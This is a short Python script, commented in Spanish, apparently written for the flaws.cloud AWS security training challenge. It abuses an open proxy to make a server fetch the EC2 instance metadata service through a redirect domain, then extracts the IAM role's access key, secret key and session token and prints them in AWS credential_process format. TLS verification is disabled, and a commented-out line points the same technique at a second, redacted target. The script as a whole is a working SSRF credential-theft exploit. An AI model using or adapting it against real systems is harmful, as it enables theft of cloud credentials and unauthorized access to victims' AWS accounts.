#!/usr/bin/env python3

import json
import requests

# Deshabilitar advertencias de seguridad para HTTPS
requests.packages.urllib3.disable_warnings()

session = requests.session()
session.verify = False

#URL = "https://redacted/social///aws.deb-security.cl/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
URL = "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy///aws.deb-security.cl/latest/meta-data/iam/security-credentials/flaws"

# Headers y Cookies (Si es necesario)
headers = {
    "some": "header",
    "Connection": "close"
}
cookies = {"some": "cookie"}

response = session.get(URL, headers=headers, cookies=cookies)

# Verificar si se obtuvo una respuesta aunque sea con código de estado 400
if response.status_code == 400:
    # Intentar obtener la respuesta como JSON
    try:
        raw_creds = response.json()
        output = {
            "Version": 1,
            "AccessKeyId": raw_creds["AccessKeyId"],
            "SecretAccessKey": raw_creds["SecretAccessKey"],
            "SessionToken": raw_creds["Token"],
            "Expiration": raw_creds["Expiration"]
        }
        print(json.dumps(output))
    except json.JSONDecodeError:
        print("Error parsing the server response.")
else:
    print(f"Error: Received HTTP {response.status_code} from the server.")

